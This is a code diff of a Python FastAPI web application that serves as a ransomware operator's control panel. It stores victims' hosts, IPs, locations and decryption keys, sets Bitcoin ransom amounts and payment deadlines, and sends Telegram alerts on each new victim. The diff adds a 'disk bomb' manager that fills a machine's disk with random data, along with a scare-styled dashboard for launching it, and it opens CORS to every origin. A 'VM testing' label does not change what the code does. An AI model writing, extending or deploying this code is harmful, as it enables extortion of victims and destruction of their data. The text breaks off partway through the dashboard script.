@@ -1,3 +1,8 @@
+#!/usr/bin/env python3
+"""
+PUSS CONTROL PANEL - Complete System
+FOR VM TESTING ONLY
+"""
 
 import os
 import sys
@@ -10,12 +15,14 @@ import secrets
 import threading
 import socket
 import uuid
+import subprocess
 import logging
+import platform
 from datetime import datetime, timedelta
 from typing import Optional, Dict, Any, List
 from contextlib import asynccontextmanager
-from fastapi import FastAPI, Request, Response, HTTPException, Depends, status
-from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
+from fastapi import FastAPI, Request, Response, HTTPException, status, WebSocket, WebSocketDisconnect
+from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, FileResponse
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.security import HTTPBasic, HTTPBasicCredentials
 from pydantic import BaseModel, Field
@@ -31,7 +38,7 @@ class Config:
     ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL')
     BTC_WALLET = os.environ.get('BTC_WALLET')
     RANSOM_AMOUNT = os.environ.get('RANSOM_AMOUNT', '0.5')
-    SERVER_URL = os.environ.get('SERVER_URL',)
+    SERVER_URL = os.environ.get('SERVER_URL')
     TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
     TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
     SECRET_KEY = os.environ.get('SECRET_KEY', secrets.token_hex(32))
@@ -39,79 +46,18 @@ class Config:
     LOG_LEVEL = os.environ.get('LOG_LEVEL', 'WARNING')
 
 # ============================================================================
-# LOGGING SETUP
+# LOGGING
 # ============================================================================
 
 logging.basicConfig(
     level=getattr(logging, Config.LOG_LEVEL),
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    handlers=[
-        logging.FileHandler('system.log'),
-        logging.StreamHandler()
-    ]
+    handlers=[logging.FileHandler('system.log'), logging.StreamHandler()]
 )
 logger = logging.getLogger('puss_system')
 
 # ============================================================================
-# DATA MODELS
-# ============================================================================
-
-class VictimBase(BaseModel):
-    id: str
-    files_encrypted: int
-    hostname: str
-    ip: str
-    country: str
-    city: str
-    lat: float
-    lon: float
-    os: str
-    status: str
-    created_at: str
-    payment_deadline: str
-    ransom: str
-    wallet: str
-
-class VictimCreate(BaseModel):
-    victim_id: str
-    files: int = 0
-    hostname: Optional[str] = None
-    ip: Optional[str] = None
-    country: Optional[str] = None
-    city: Optional[str] = None
-    lat: Optional[float] = 0
-    lon: Optional[float] = 0
-    os: Optional[str] = None
-
-class PaymentVerify(BaseModel):
-    victim_id: str
-    tx_id: str
-
-class OwnerLogin(BaseModel):
-    password: str
-
-class SettingsUpdate(BaseModel):
-    ransom_amount: Optional[str] = None
-    payment_window: Optional[int] = None
-    telegram_notifications: Optional[bool] = None
-
-class NoteAdd(BaseModel):
-    victim_id: str
-    note: str
-
-class TagAdd(BaseModel):
-    victim_id: str
-    tag: str
-
-class DeadlineExtend(BaseModel):
-    victim_id: str
-    hours: int = 24
-
-class BulkDelete(BaseModel):
-    status: Optional[str] = None
-
-# ============================================================================
-# TELEGRAM INTEGRATION
+# TELEGRAM
 # ============================================================================
 
 class TelegramService:
@@ -120,62 +66,111 @@ class TelegramService:
         self.chat_id = chat_id
         self.enabled = bool(token and chat_id)
         self.base_url = f"https://api.telegram.org/bot{token}"
-        self.logger = logging.getLogger('telegram')
     
     def send(self, text: str) -> bool:
         if not self.enabled:
             return False
         try:
-            response = requests.post(
-                f"{self.base_url}/sendMessage",
-                json={
-                    'chat_id': self.chat_id,
-                    'text': text,
-                    'parse_mode': 'HTML'
-                },
-                timeout=5
-            )
-            if response.status_code == 200:
-                self.logger.info(f"Message sent: {text[:50]}...")
-                return True
-            self.logger.error(f"Failed to send: {response.text}")
-            return False
-        except Exception as e:
-            self.logger.error(f"Telegram error: {e}")
+            requests.post(f"{self.base_url}/sendMessage", json={
+                'chat_id': self.chat_id,
+                'text': text,
+                'parse_mode': 'HTML'
+            }, timeout=5)
+            return True
+        except:
             return False
     
     def notify_new(self, victim: Dict) -> None:
-        if not self.enabled:
-            return
-        msg = (f"NEW REGISTRATION\n"
-               f"ID: {victim['id']}\n"
-               f"Host: {victim['hostname']}\n"
-               f"Location: {victim['city']}, {victim['country']}\n"
-               f"IP: {victim['ip']}")
-        self.send(msg)
-    
-    def notify_payment(self, victim: Dict) -> None:
-        if not self.enabled:
-            return
-        msg = (f"PAYMENT RECEIVED\n"
-               f"ID: {victim['id']}\n"
-               f"Amount: {victim['ransom']}\n"
-               f"TX: {victim['payment_tx'][:16]}...")
-        self.send(msg)
-    
-    def notify_deadline(self, victim: Dict, hours: int) -> None:
-        if not self.enabled:
-            return
-        msg = (f"DEADLINE APPROACHING\n"
-               f"ID: {victim['id']}\n"
-               f"Hours left: {hours}\n"
-               f"Location: {victim['city']}, {victim['country']}")
-        self.send(msg)
+        if self.enabled:
+            self.send(f"NEW VICTIM\nID: {victim['id']}\nLocation: {victim.get('city','Unknown')}")
 
 telegram = TelegramService(Config.TELEGRAM_BOT_TOKEN, Config.TELEGRAM_CHAT_ID)
 
 # ============================================================================
-# DATABASE LAYER
+# DISK BOMB MANAGER
+# ============================================================================
+
+class DiskBombManager:
+    def __init__(self):
+        self.active_bombs = {}
+        self.bomb_threads = {}
+        self.ws_connections = {}
+    
+    def start_bomb(self, client_id: str, filename: str = "explosion.dat") -> bool:
+        if client_id in self.active_bombs and self.active_bombs[client_id].get('running'):
+            return False
+        
+        self.active_bombs[client_id] = {
+            'running': True,
+            'filename': filename,
+            'start_time': datetime.now().isoformat(),
+            'bytes_written': 0,
+            'size_gb': 0,
+            'status': 'running'
+        }
+        
+        thread = threading.Thread(target=self._run_bomb, args=(client_id, filename))
+        thread.daemon = True
+        self.bomb_threads[client_id] = thread
+        thread.start()
+        return True
+    
+    def _run_bomb(self, client_id: str, filename: str):
+        try:
+            one_gb = 1073741824
+            chunk = 1024 * 1024
+            bytes_written = 0
+            
+            with open(filename, 'wb') as f:
+                while self.active_bombs[client_id].get('running'):
+                    for _ in range(one_gb // chunk):
+                        if not self.active_bombs[client_id].get('running'):
+                            break
+                        f.write(os.urandom(chunk))
+                        bytes_written += chunk
+                        f.flush()
+                        os.fsync(f.fileno())
+                        
+                        size = bytes_written / one_gb
+                        self.active_bombs[client_id]['bytes_written'] = bytes_written
+                        self.active_bombs[client_id]['size_gb'] = size
+                        
+                        self._send_update(client_id, {
+                            'type': 'progress',
+                            'size_gb': size,
+                            'bytes': bytes_written
+                        })
+                    
+                    time.sleep(1)
+        except Exception as e:
+            self.active_bombs[client_id]['status'] = f'error: {e}'
+        finally:
+            self.active_bombs[client_id]['running'] = False
+    
+    def stop_bomb(self, client_id: str) -> bool:
+        if client_id in self.active_bombs:
+            self.active_bombs[client_id]['running'] = False
+            return True
+        return False
+    
+    def get_status(self, client_id: str) -> Dict:
+        return self.active_bombs.get(client_id, {'running': False})
+    
+    def register_ws(self, client_id: str, websocket):
+        self.ws_connections[client_id] = websocket
+    
+    def _send_update(self, client_id: str, data: Dict):
+        if client_id in self.ws_connections:
+            try:
+                import asyncio
+                asyncio.create_task(self.ws_connections[client_id].send_json(data))
+            except:
+                pass
+
+bomb_manager = DiskBombManager()
+
+# ============================================================================
+# DATABASE
 # ============================================================================
 
 class Database:
@@ -184,16 +179,13 @@ class Database:
         self.victims: Dict[str, Dict] = {}
         self.logs: List[Dict] = []
         self.settings = {
-            'ransom_amount': Config.RANSOM_AMOUNT,
-            'payment_window': 72,
-            'telegram_enabled': telegram.enabled,
-            'version': '2.0.0'
+            'ransom': Config.RANSOM_AMOUNT,
+            'wallet': Config.BTC_WALLET,
+            'window': 72
         }
         self._load()
-        self._start_monitor()
-        logger.info(f"Database initialized with {len(self.victims)} victims")
     
-    def _load(self) -> None:
+    def _load(self):
         try:
             if os.path.exists(self.db_path):
                 with open(self.db_path, 'r') as f:
@@ -201,176 +193,74 @@ class Database:
                     self.victims = data.get('victims', {})
                     self.logs = data.get('logs', [])
                     self.settings.update(data.get('settings', {}))
-                logger.info(f"Loaded {len(self.victims)} victims from disk")
-        except Exception as e:
-            logger.error(f"Failed to load database: {e}")
+        except:
+            pass
     
-    def _save(self) -> None:
-        try:
-            with open(self.db_path, 'w') as f:
-                json.dump({
-                    'victims': self.victims,
-                    'logs': self.logs[-1000:],
-                    'settings': self.settings
-                }, f, indent=2)
-        except Exception as e:
-            logger.error(f"Failed to save database: {e}")
+    def _save(self):
+        with open(self.db_path, 'w') as f:
+            json.dump({
+                'victims': self.victims,
+                'logs': self.logs[-500:],
+                'settings': self.settings
+            }, f, indent=2)
     
-    def _start_monitor(self) -> None:
-        def check_deadlines():
-            while True:
-                try:
-                    now = datetime.now()
-                    for vid, victim in self.victims.items():
-                        if victim.get('status') == 'unpaid':
-                            deadline = datetime.fromisoformat(victim['payment_deadline'])
-                            hours = (deadline - now).total_seconds() / 3600
-                            
-                            # Check thresholds
-                            if 23 < hours <= 24 and not victim.get('notified_24h'):
-                                telegram.notify_deadline(victim, 24)
-                                victim['notified_24h'] = True
-                                self._save()
-                            elif 11 < hours <= 12 and not victim.get('notified_12h'):
-                                telegram.notify_deadline(victim, 12)
-                                victim['notified_12h'] = True
-                                self._save()
-                            elif 5 < hours <= 6 and not victim.get('notified_6h'):
-                                telegram.notify_deadline(victim, 6)
-                                victim['notified_6h'] = True
-                                self._save()
-                            elif 0 < hours <= 1 and not victim.get('notified_1h'):
-                                telegram.notify_deadline(victim, 1)
-                                victim['notified_1h'] = True
-                                self._save()
-                except Exception as e:
-                    logger.error(f"Monitor error: {e}")
-                time.sleep(60)
-        
-        thread = threading.Thread(target=check_deadlines, daemon=True)
-        thread.start()
-    
-    def add_victim(self, data: VictimCreate) -> Dict:
+    def add_victim(self, victim_id: str, files: int = 0, hostname: str = "", 
+                   ip: str = "", country: str = "", city: str = "", 
+                   lat: float = 0, lon: float = 0, os_info: str = ""):
         from cryptography.fernet import Fernet
         key = Fernet.generate_key().decode()
         
         now = datetime.now()
-        deadline = now + timedelta(hours=self.settings['payment_window'])
+        deadline = now + timedelta(hours=self.settings['window'])
         
-        victim = {
-            'id': data.victim_id.upper(),
-            'files_encrypted': data.files,
-            'ransom': f"{self.settings['ransom_amount']} BTC",
-            'wallet': Config.BTC_WALLET,
+        self.victims[victim_id] = {
+            'id': victim_id,
+            'files': files,
+            'ransom': f"{self.settings['ransom']} BTC",
+            'wallet': self.settings['wallet'],
             'status': 'unpaid',
-            'payment_deadline': deadline.isoformat(),
-            'created_at': now.isoformat(),
-            'decryption_key': key,
-            'hostname': data.hostname or socket.gethostname(),
-            'ip': data.ip or '0.0.0.0',
-            'country': data.country or 'Unknown',
-            'city': data.city or 'Unknown',
-            'lat': data.lat or 0,
-            'lon': data.lon or 0,
-            'os': data.os or 'Unknown',
+            'deadline': deadline.isoformat(),
+            'created': now.isoformat(),
+            'key': key,
+            'hostname': hostname or socket.gethostname(),
+            'ip': ip or '0.0.0.0',
+            'country': country or 'Unknown',
+            'city': city or 'Unknown',
+            'lat': lat,
+            'lon': lon,
+            'os': os_info or 'Unknown',
             'paid_at': None,
-            'payment_tx': None,
-            'last_seen': now.isoformat(),
-            'notes': '',
-            'tags': [],
-            'notified_24h': False,
-            'notified_12h': False,
-            'notified_6h': False,
-            'notified_1h': False
+            'tx': None
         }
-        
-        self.victims[victim['id']] = victim
         self._save()
-        
-        self.log('info', f"New victim: {victim['id']}", victim['id'])
-        telegram.notify_new(victim)
-        logger.info(f"Victim added: {victim['id']}")
-        
-        return victim
+        self.log('info', f"New victim: {victim_id}")
+        telegram.notify_new(self.victims[victim_id])
+        return self.victims[victim_id]
     
     def get_victim(self, victim_id: str) -> Optional[Dict]:
-        return self.victims.get(victim_id.upper())
+        return self.victims.get(victim_id)
     
-    def verify_payment(self, victim_id: str, tx_id: str) -> bool:
-        vid = victim_id.upper()
-        if vid in self.victims:
-            self.victims[vid]['status'] = 'paid'
-            self.victims[vid]['payment_tx'] = tx_id
-            self.victims[vid]['paid_at'] = datetime.now().isoformat()
+    def update_victim(self, victim_id: str, data: Dict) -> bool:
+        if victim_id in self.victims:
+            self.victims[victim_id].update(data)
             self._save()
-            
-            self.log('success', f"Payment verified: {vid}", vid)
-            telegram.notify_payment(self.victims[vid])
-            logger.info(f"Payment verified: {vid}")
             return True
         return False
     
-    def update_victim(self, victim_id: str, data: Dict) -> bool:
-        vid = victim_id.upper()
-        if vid in self.victims:
-            self.victims[vid].update(data)
-            self.victims[vid]['last_seen'] = datetime.now().isoformat()
+    def verify_payment(self, victim_id: str, tx: str) -> bool:
+        if victim_id in self.victims:
+            self.victims[victim_id]['status'] = 'paid'
+            self.victims[victim_id]['tx'] = tx
+            self.victims[victim_id]['paid_at'] = datetime.now().isoformat()
             self._save()
+            self.log('success', f"Payment for {victim_id}")
             return True
         return False
     
     def delete_victim(self, victim_id: str) -> bool:
-        vid = victim_id.upper()
-        if vid in self.victims:
-            del self.victims[vid]
+        if victim_id in self.victims:
+            del self.victims[victim_id]
             self._save()
-            self.log('warning', f"Deleted: {vid}")
-            logger.warning(f"Victim deleted: {vid}")
-            return True
-        return False
-    
-    def bulk_delete(self, status: Optional[str] = None) -> int:
-        to_delete = []
-        for vid, v in self.victims.items():
-            if status is None or v.get('status') == status:
-                to_delete.append(vid)
-        
-        for vid in to_delete:
-            del self.victims[vid]
-        
-        self._save()
-        self.log('info', f"Bulk deleted {len(to_delete)} victims")
-        logger.info(f"Bulk deleted {len(to_delete)} victims")
-        return len(to_delete)
-    
-    def extend_deadline(self, victim_id: str, hours: int) -> bool:
-        vid = victim_id.upper()
-        if vid in self.victims and self.victims[vid]['status'] == 'unpaid':
-            current = datetime.fromisoformat(self.victims[vid]['payment_deadline'])
-            new = current + timedelta(hours=hours)
-            self.victims[vid]['payment_deadline'] = new.isoformat()
-            self._save()
-            self.log('info', f"Deadline extended for {vid} by {hours}h", vid)
-            logger.info(f"Deadline extended: {vid} +{hours}h")
-            return True
-        return False
-    
-    def add_note(self, victim_id: str, note: str) -> bool:
-        vid = victim_id.upper()
-        if vid in self.victims:
-            self.victims[vid]['notes'] = note
-            self._save()
-            return True
-        return False
-    
-    def add_tag(self, victim_id: str, tag: str) -> bool:
-        vid = victim_id.upper()
-        if vid in self.victims:
-            if 'tags' not in self.victims[vid]:
-                self.victims[vid]['tags'] = []
-            if tag not in self.victims[vid]['tags']:
-                self.victims[vid]['tags'].append(tag)
-                self._save()
             return True
         return False
     
@@ -381,491 +271,448 @@ class Database:
         total = len(self.victims)
         paid = sum(1 for v in self.victims.values() if v.get('status') == 'paid')
         unpaid = total - paid
-        expired = sum(1 for v in self.victims.values() 
-                     if v.get('status') == 'unpaid' 
-                     and datetime.fromisoformat(v['payment_deadline']) < datetime.now())
-        
-        try:
-            amount = float(self.settings['ransom_amount'])
-            total_btc = paid * amount
-        except:
-            total_btc = paid * 0.5
-        
-        countries = {}
-        for v in self.victims.values():
-            c = v.get('country', 'Unknown')
-            countries[c] = countries.get(c, 0) + 1
-        
         return {
             'total': total,
             'paid': paid,
             'unpaid': unpaid,
-            'expired': expired,
-            'total_btc': f"{total_btc:.2f}",
-            'countries': countries,
-            'success_rate': round((paid/total*100) if total > 0 else 0, 1),
-            'timestamp': datetime.now().isoformat()
+            'bombs': len(bomb_manager.active_bombs),
+            'btc': paid * float(self.settings['ransom'])
         }
     
-    def log(self, level: str, message: str, victim_id: Optional[str] = None) -> None:
+    def log(self, level: str, msg: str):
         self.logs.append({
-            'timestamp': datetime.now().isoformat(),
+            'time': datetime.now().isoformat(),
             'level': level,
-            'message': message,
-            'victim_id': victim_id
+            'msg': msg
         })
         self._save()
-    
-    def get_logs(self, limit: int = 100) -> List:
-        return self.logs[-limit:]
-    
-    def update_settings(self, updates: Dict) -> Dict:
-        self.settings.update(updates)
-        self._save()
-        self.log('info', "Settings updated")
-        return self.settings
+        logger.info(f"[{level}] {msg}")
 
 db = Database()
 
 # ============================================================================
-# AUTHENTICATION
+# AUTH
 # ============================================================================
 
 security = HTTPBasic()
 
-def verify_owner(credentials: HTTPBasicCredentials = Depends(security)):
-    correct_password = hmac.compare_digest(
-        credentials.password.encode('utf-8'),
-        Config.OWNER_PASSWORD.encode('utf-8')
-    )
-    if not correct_password:
-        raise HTTPException(
-            status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="Invalid credentials"
-        )
-    return credentials.username
+def verify_owner(creds: HTTPBasicCredentials = Depends(security)):
+    if not hmac.compare_digest(creds.password.encode(), Config.OWNER_PASSWORD.encode()):
+        raise HTTPException(status_code=401)
+    return creds.username
 
 # ============================================================================
-# FASTAPI APPLICATION
+# FASTAPI APP
 # ============================================================================
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    logger.info("Starting PUSS Control Panel")
-    logger.info(f"Environment: {Config.ENVIRONMENT}")
-    logger.info(f"Telegram: {'Enabled' if telegram.enabled else 'Disabled'}")
+    logger.info("PUSS System Started")
     yield
     logger.info("Shutting down")
 
-app = FastAPI(
-    title="PUSS Control Panel",
-    version="2.0.0",
-    lifespan=lifespan,
-    docs_url=None,
-    redoc_url=None
-)
-
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
+app = FastAPI(title="PUSS System", version="3.0", lifespan=lifespan, docs_url=None, redoc_url=None)
+app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
 
 # ============================================================================
-# HTML TEMPLATES (MINIMAL, PROFESSIONAL)
+# WEBSOCKET
+# ============================================================================
+
+@app.websocket("/ws/{client_id}")
+async def websocket_endpoint(websocket: WebSocket, client_id: str):
+    await websocket.accept()
+    bomb_manager.register_ws(client_id, websocket)
+    try:
+        while True:
+            await websocket.receive_text()
+    except:
+        pass
+
+# ============================================================================
+# HTML TEMPLATES - 2000s SCARY STYLE
 # ============================================================================
 
 INDEX_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Access</title>
+    <title>SYSTEM</title>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #0a0a0a;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', monospace;
+            background: black;
             color: #00ff00;
-            line-height: 1.6;
-        }
-        .terminal {
-            max-width: 800px;
-            margin: 50px auto;
+            font-family: 'Courier New', monospace;
+            margin: 0;
             padding: 20px;
-            background: #000000;
-            border: 1px solid #1a1a1a;
+            cursor: crosshair;
         }
+        
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            border: 2px solid #ff0000;
+            padding: 20px;
+            background: #0a0a0a;
+            box-shadow: 0 0 30px #ff0000;
+        }
+        
         .header {
-            border-bottom: 1px solid #1a1a1a;
-            padding: 10px 0;
+            text-align: center;
+            border-bottom: 1px solid #ff0000;
+            padding: 10px;
             margin-bottom: 20px;
-            color: #666;
         }
-        .prompt {
-            color: #00ff00;
-            margin-right: 10px;
+        
+        .header h1 {
+            font-size: 40px;
+            color: #ff0000;
+            text-shadow: 0 0 10px #ff0000;
+            margin: 0;
+            animation: flicker 2s infinite;
         }
-        input {
-            background: transparent;
-            border: none;
-            color: #00ff00;
-            font-family: monospace;
-            font-size: 16px;
-            width: 300px;
-            outline: none;
+        
+        @keyframes flicker {
+            0% { opacity: 1; }
+            50% { opacity: 0.8; }
+            51% { opacity: 1; }
+            60% { opacity: 0.9; }
+            100% { opacity: 1; }
         }
+        
         .stats {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
             gap: 10px;
             margin: 20px 0;
         }
+        
         .stat {
-            border: 1px solid #1a1a1a;
-            padding: 10px;
+            border: 1px solid #ff0000;
+            padding: 15px;
             text-align: center;
+            background: #1a0000;
         }
-        .stat-value {
-            font-size: 24px;
+        
+        .stat .value {
+            font-size: 32px;
             font-weight: bold;
-            color: #00ff00;
-        }
-        .stat-label {
-            font-size: 12px;
-            color: #666;
-        }
-        .button {
-            background: #1a1a1a;
-            border: none;
-            color: #00ff00;
-            padding: 10px 20px;
-            font-family: monospace;
-            cursor: pointer;
-        }
-        .button:hover {
-            background: #2a2a2a;
-        }
-        .error {
             color: #ff0000;
-            margin: 10px 0;
         }
-        .status {
-            margin-top: 20px;
-            padding: 10px;
-            border: 1px solid #1a1a1a;
+        
+        .stat .label {
             font-size: 12px;
-            color: #666;
+            color: #ff6666;
         }
-    </style>
-</head>
-<body>
-    <div class="terminal">
-        <div class="header">PUSS SYSTEM v2.0.0 | SECURE TERMINAL</div>
         
-        <div class="stats" id="stats">
-            <div class="stat"><div class="stat-value">-</div><div class="stat-label">TOTAL</div></div>
-            <div class="stat"><div class="stat-value">-</div><div class="stat-label">PAID</div></div>
-            <div class="stat"><div class="stat-value">-</div><div class="stat-label">UNPAID</div></div>
-            <div class="stat"><div class="stat-value">-</div><div class="stat-label">BTC</div></div>
-        </div>
-        
-        <div style="margin: 20px 0;">
-            <span class="prompt">></span>
-            <input type="password" id="password" placeholder="enter password" onkeypress="handleKey(event)">
-        </div>
-        
-        <div>
-            <button class="button" onclick="login()">[ AUTHENTICATE ]</button>
-        </div>
-        
-        <div class="status" id="status">
-            SYSTEM READY | TELEGRAM: {% if telegram.enabled %}CONNECTED{% else %}DISABLED{% endif %}
-        </div>
-    </div>
-
-    <script>
-        async function loadStats() {
-            try {
-                const res = await fetch('/api/stats');
-                const stats = await res.json();
-                document.getElementById('stats').innerHTML = `
-                    <div class="stat"><div class="stat-value">${stats.total}</div><div class="stat-label">TOTAL</div></div>
-                    <div class="stat"><div class="stat-value">${stats.paid}</div><div class="stat-label">PAID</div></div>
-                    <div class="stat"><div class="stat-value">${stats.unpaid}</div><div class="stat-label">UNPAID</div></div>
-                    <div class="stat"><div class="stat-value">${stats.total_btc}</div><div class="stat-label">BTC</div></div>
-                `;
-            } catch(e) {}
-        }
-
-        function handleKey(e) {
-            if (e.key === 'Enter') login();
-        }
-
-        async function login() {
-            const pwd = document.getElementById('password').value;
-            const res = await fetch('/api/owner/login', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({password: pwd})
-            });
-            const data = await res.json();
-            if (data.success) {
-                window.location.href = '/dashboard';
-            } else {
-                document.getElementById('status').innerHTML = 'ACCESS DENIED';
-                document.getElementById('password').value = '';
-            }
-        }
-
-        loadStats();
-        setInterval(loadStats, 10000);
-    </script>
-</body>
-</html>
-"""
-
-DASHBOARD_HTML = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Control Panel</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0a0a0a;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', monospace;
-            color: #00ff00;
-            line-height: 1.6;
-            padding: 20px;
-        }
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-        }
-        .header {
-            border-bottom: 1px solid #1a1a1a;
-            padding: 10px 0;
-            margin-bottom: 20px;
-            display: flex;
-            justify-content: space-between;
-        }
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(5, 1fr);
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        .stat {
-            border: 1px solid #1a1a1a;
-            padding: 15px;
-        }
-        .stat-value { font-size: 28px; font-weight: bold; }
-        .stat-label { font-size: 12px; color: #666; }
-        .table {
-            border: 1px solid #1a1a1a;
-            overflow-x: auto;
-        }
-        .row {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr;
-            padding: 10px;
-            border-bottom: 1px solid #1a1a1a;
-            min-width: 1000px;
-        }
-        .row.header {
-            background: #1a1a1a;
-            color: #666;
-            font-weight: bold;
-        }
-        .badge {
-            padding: 2px 6px;
-            font-size: 11px;
-        }
-        .badge.paid { background: #003300; color: #00ff00; }
-        .badge.unpaid { background: #330000; color: #ff0000; }
-        .button {
-            background: #1a1a1a;
-            border: none;
-            color: #00ff00;
-            padding: 5px 10px;
-            font-family: monospace;
-            cursor: pointer;
-            font-size: 12px;
-        }
-        .button.small { padding: 2px 5px; }
         .panel {
-            border: 1px solid #1a1a1a;
+            border: 2px solid #ff0000;
+            margin: 20px 0;
             padding: 15px;
-            margin-bottom: 20px;
-        }
-        input, select {
             background: #1a1a1a;
-            border: none;
+        }
+        
+        .panel h3 {
+            color: #ff0000;
+            margin-top: 0;
+            border-bottom: 1px solid #ff0000;
+            padding-bottom: 5px;
+        }
+        
+        input, select {
+            background: black;
+            border: 1px solid #ff0000;
             color: #00ff00;
             padding: 8px;
-            font-family: monospace;
-            margin-right: 10px;
+            font-family: 'Courier New', monospace;
+            margin: 5px;
         }
+        
+        button {
+            background: #ff0000;
+            color: black;
+            border: none;
+            padding: 10px 20px;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 5px;
+        }
+        
+        button:hover {
+            background: #ff6666;
+            box-shadow: 0 0 20px #ff0000;
+        }
+        
+        .danger {
+            background: black;
+            color: #ff0000;
+            border: 1px solid #ff0000;
+        }
+        
+        .danger:hover {
+            background: #ff0000;
+            color: black;
+        }
+        
+        .table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        .table th {
+            background: #ff0000;
+            color: black;
+            padding: 8px;
+        }
+        
+        .table td {
+            border: 1px solid #ff0000;
+            padding: 8px;
+        }
+        
+        .status-paid {
+            color: #00ff00;
+        }
+        
+        .status-unpaid {
+            color: #ff0000;
+        }
+        
+        .progress {
+            width: 100%;
+            height: 20px;
+            background: #1a1a1a;
+            border: 1px solid #ff0000;
+            margin: 10px 0;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: #ff0000;
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
         .logs {
             height: 200px;
             overflow-y: auto;
-            background: #000;
+            background: black;
+            border: 1px solid #ff0000;
             padding: 10px;
             font-size: 12px;
         }
-        .log-entry {
-            border-bottom: 1px solid #1a1a1a;
-            padding: 5px 0;
+        
+        .blink {
+            animation: blink 1s infinite;
         }
-        .flex { display: flex; gap: 10px; flex-wrap: wrap; }
+        
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+        
+        .ascii {
+            color: #ff0000;
+            font-size: 10px;
+            white-space: pre;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <div>PUSS CONTROL PANEL v2.0.0</div>
-            <div>
-                <span id="timestamp"></span>
-                <button class="button" onclick="logout()">[ LOGOUT ]</button>
+            <h1>⛓️ SYSTEM LOCK ⛓️</h1>
+            <div class="ascii">
+                /\\____/\\    /\\____/\\
+                (  o  o )  (  o  o )
+                (   ==   )(   ==   )
+                (         )(         )
+                (  )  (  )(  )  (  )
             </div>
         </div>
-
-        <div class="stats" id="stats"></div>
-
+        
+        <div class="stats" id="stats">
+            <div class="stat"><div class="value">-</div><div class="label">VICTIMS</div></div>
+            <div class="stat"><div class="value">-</div><div class="label">PAID</div></div>
+            <div class="stat"><div class="value">-</div><div class="label">UNPAID</div></div>
+            <div class="stat"><div class="value">-</div><div class="label">BOMBS</div></div>
+        </div>
+        
         <div class="panel">
-            <h3 style="margin-bottom: 15px;">CONTROLS</h3>
-            <div class="flex">
-                <input type="text" id="victim_id" placeholder="victim id">
-                <input type="number" id="hours" value="24" style="width: 80px;">
-                <button class="button" onclick="extendDeadline()">EXTEND DEADLINE</button>
+            <h3>💣 DISK BOMB CONTROL</h3>
+            <div>
+                <input type="text" id="bomb_client" placeholder="Client ID">
+                <input type="text" id="bomb_file" placeholder="Filename" value="explosion.dat">
+                <button onclick="startBomb()">[ START BOMB ]</button>
+                <button class="danger" onclick="stopBomb()">[ STOP BOMB ]</button>
+                <button onclick="checkBomb()">[ STATUS ]</button>
             </div>
-            <div class="flex" style="margin-top: 10px;">
-                <select id="bulk_status">
-                    <option value="">ALL</option>
-                    <option value="paid">PAID</option>
-                    <option value="unpaid">UNPAID</option>
-                </select>
-                <button class="button" onclick="bulkDelete()">BULK DELETE</button>
-                <button class="button" onclick="refreshData()">REFRESH</button>
+            <div id="bomb_status"></div>
+            <div class="progress" id="bomb_progress" style="display:none;">
+                <div class="progress-fill" id="bomb_fill"></div>
             </div>
         </div>
-
-        <div class="table">
-            <div class="row header">
-                <div>ID</div>
-                <div>FILES</div>
-                <div>HOST</div>
-                <div>LOCATION</div>
-                <div>DEADLINE</div>
-                <div>STATUS</div>
-                <div>RANSOM</div>
-                <div>ACTION</div>
+        
+        <div class="panel">
+            <h3>📋 VICTIMS</h3>
+            <div style="margin-bottom:10px;">
+                <input type="text" id="victim_id" placeholder="Victim ID">
+                <button onclick="getVictim()">[ GET ]</button>
+                <button onclick="deleteVictim()" class="danger">[ DELETE ]</button>
             </div>
-            <div id="victims"></div>
+            <div id="victim_info"></div>
         </div>
-
-        <div class="panel" style="margin-top: 20px;">
-            <h3 style="margin-bottom: 15px;">SYSTEM LOGS</h3>
+        
+        <div class="panel">
+            <h3>📊 ALL VICTIMS</h3>
+            <table class="table" id="victims_table">
+                <tr><th>ID</th><th>FILES</th><th>LOCATION</th><th>STATUS</th></tr>
+            </table>
+        </div>
+        
+        <div class="panel">
+            <h3>📝 SYSTEM LOGS</h3>
             <div class="logs" id="logs"></div>
+        </div>
+        
+        <div style="text-align:center; margin-top:20px; color:#666;">
+            <span class="blink">></span> SYSTEM ACTIVE <span class="blink"><</span>
         </div>
     </div>
 
     <script>
-        async function loadData() {
-            const [statsRes, victimsRes, logsRes] = await Promise.all([
-                fetch('/api/stats'),
-                fetch('/api/victims'),
